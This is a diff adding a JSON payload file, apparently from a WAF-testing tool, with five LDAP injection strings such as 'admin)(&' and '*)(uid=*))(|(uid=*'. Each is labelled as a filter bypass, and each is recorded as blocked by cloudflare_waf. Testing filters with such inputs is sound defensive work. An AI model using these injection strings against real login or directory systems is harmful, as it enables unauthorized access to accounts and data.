@@ -1,0 +1,77 @@
+{
+  "category": "ldap_injection",
+  "subcategory": "basic",
+  "count": 5,
+  "payloads": [
+    {
+      "id": "ldap_injection-1001",
+      "category": "ldap_injection",
+      "subcategory": "basic",
+      "payload": "*",
+      "description": "LDAP wildcard",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ldap_injection-1002",
+      "category": "ldap_injection",
+      "subcategory": "basic",
+      "payload": "admin)(&",
+      "description": "LDAP AND bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ldap_injection-1003",
+      "category": "ldap_injection",
+      "subcategory": "basic",
+      "payload": "admin)(|",
+      "description": "LDAP OR bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ldap_injection-1004",
+      "category": "ldap_injection",
+      "subcategory": "basic",
+      "payload": "*)(uid=*))(|(uid=*",
+      "description": "LDAP complex bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ldap_injection-1005",
+      "category": "ldap_injection",
+      "subcategory": "basic",
+      "payload": "admin)(!(&(objectClass=*",
+      "description": "LDAP NOT bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
